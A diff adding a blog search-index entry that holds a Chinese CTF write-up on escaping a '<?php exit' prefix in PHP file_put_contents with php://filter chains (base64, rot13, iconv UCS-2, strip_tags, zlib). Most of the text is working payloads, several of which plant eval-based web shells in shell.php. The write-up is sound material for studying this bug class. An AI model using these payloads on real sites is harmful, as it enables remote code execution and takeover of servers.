@@ -209,4 +209,70 @@
 
 ]]></content>
   </entry>
+  <entry>
+    <title>全国工控2020-web-easyphp</title>
+    <url>/2020/10/27/%E5%85%A8%E5%9B%BD%E5%B7%A5%E6%8E%A72020-web-easyphp/</url>
+    <content><![CDATA[<h1 id="全国工控2020-web-easyphp"><a href="#全国工控2020-web-easyphp" class="headerlink" title="全国工控2020-web-easyphp"></a>全国工控2020-web-easyphp</h1><h2 id="1-从伪协议开始说起"><a href="#1-从伪协议开始说起" class="headerlink" title="1.从伪协议开始说起"></a>1.从伪协议开始说起</h2><p>php://filter是PHP中独有的协议，该协议流允许我们作为一个中间流来处理其他流，</p>
+<p>在之前三个白帽中有一个比赛，其中一部分的代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line">$content .= $_POST[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">&#x27;filename&#x27;</span>], $content);</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-base64"><a href="#1-base64" class="headerlink" title="1.base64"></a>1.base64</h3><p>在这里我们可以看见，如果正常的编译代码，由于在开头加入了exit内容，即使我们写入了一句话也无法解析。</p>
+<p>但是我们可以通过filename在php写入的时候构造协议，所以利用base64-decode方法解码构造一句话的payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>但是在这里我们又会发现如果直接打入进去，base64解析没有成功，这就是因为base是由4字节组成一次payload。所以话说回去，</p>
+<p>当我们使用base64decode协议的时候，&lt; ? ; ?&gt;等等都不会被解析，所以源代码则会被识别为：</p>
+<p>phpexit，而base64是四个字节还原成一个字母，故我们需要再占一个位数，给她，也就是phpexit[?]构造成八个字节供basedecode使用，之后在后面再编上我们自己的payload，所以这道题可以构造如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php&amp;txt=cPD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>
+
+<p>但是这里仍需要注意，我们构造的时候payload当中不允许出现+号等特殊字符，否则会遇见没有被写上去情况。，实际上，除了base过滤器，还有很多过滤器可以供给我们使用：</p>
+<p>官网：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.php 过滤器</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.convert.php 转换过滤器</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php 字符过滤器</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-rot13"><a href="#2-rot13" class="headerlink" title="2.rot13"></a>2.rot13</h3><p>除此之外我尝试使用rot13来绕过，但是会发现rot13之后的结果不合法</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.rot13/resource=shell.php&amp;txt=<span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>得到php为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>cuc rkvg; <span class="meta">?&gt;</span><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样的话，因为多了一个分号，而导致失败了（开启短标签的情况下，只要用&lt;? ?&gt;中的内容就会被解析）但如果关闭短标签的情况下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">txt=<span class="meta">?&gt;</span><span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>&amp;filename=php:<span class="comment">//filter/write=string.rot13/resource=shell.php</span></span><br></pre></td></tr></table></figure>
+
+<p>成功！除此之外，还补充一种骚思路：</p>
+<h3 id="3-iconv字符编码转换"><a href="#3-iconv字符编码转换" class="headerlink" title="3.iconv字符编码转换"></a>3.iconv字符编码转换</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>iconv函数接收三个参数，当前编码，转换后编码，之后再转回去，所以利用该特性，我们可以反其道行之。但是在这里，利用该字符编码，会导致出现之前的+号的问题，于是就失败了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.utf-7.utf-8/resource=shell.php&amp;txt=?+AD4-+ADw?php phpinfo()+ADs ?+AD4-</span></span><br></pre></td></tr></table></figure>
+
+<p>根据大佬给出的UCS2-2 编码的方式：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，UCS2的编码方式是2位一次转换，所以我们必须保证需要转换的编码为2位数，不够的我们可以使用空格占位,而我们上面的转换之后直接用的话，会发现无法转换，这是因为必须保证&lt;?php exit();也被成功转换，所以我们再前面再加上一个1即可，</p>
+<p>最终payload：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp phpipfn(o;)&gt;?</span></span><br></pre></td></tr></table></figure>
+
+<p>写入shell：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp+pvela$(P_SO[T]1;)&gt;?</span></span><br></pre></td></tr></table></figure>
+
+<p>4.组合使用：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;?</span></span><br></pre></td></tr></table></figure>
+
+<p>还可以尝试使用srtip_tags+base64的方式进行绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=<span class="meta">?&gt;</span>PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>
+
+<p>经过该方式构造的payload，会进行strip_tags，去除掉了前面的内容，之后再用base64解压了我们的内容。</p>
+<p>讲完上面的，再回到wmctf的check in2，题目的源码为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|dechunk|\.\./i&#x27;</span>, $content))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content, <span class="string">&#x27;&lt;?php exit();&#x27;</span> . $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤器过滤了很多，我们只剩下了压缩过滤器，我们可以通过zlib.inflate解压字符，之后再利用zlib.deflate压缩的方式getshell，str.tolower会在</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%0deval($_GET[1]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>除此之外，还有二次编码绕过的方式</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?content=php://filter/write=string.%7%32ot13|<span class="meta">?&gt;</span><span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>|/resource=shell.php</span></span><br></pre></td></tr></table></figure>
+
+<p> 而昨天的比赛过滤了tolower,upper等等，甚至又把%过滤了，导致我们没法用上面两个payload了，但是我们依然可以利用zlib的 deflate，之后再利用url编码解析，得出如下payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%2</span></span><br><span class="line"><span class="number">8</span>%<span class="number">50</span>%<span class="number">28</span>%ae%<span class="number">2</span>c%<span class="number">2</span>e%<span class="number">49</span>%cd%d5%<span class="number">50</span>%<span class="number">89</span>%<span class="number">77</span>%<span class="number">77</span>%<span class="number">0</span>d%<span class="number">89</span>%<span class="number">8</span>e%<span class="number">8</span>f%d5%b4%b6%b7%<span class="number">03</span>%<span class="number">3</span>C%<span class="number">3</span>F/resourc</span><br><span class="line">e=shell.php </span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
 </search>
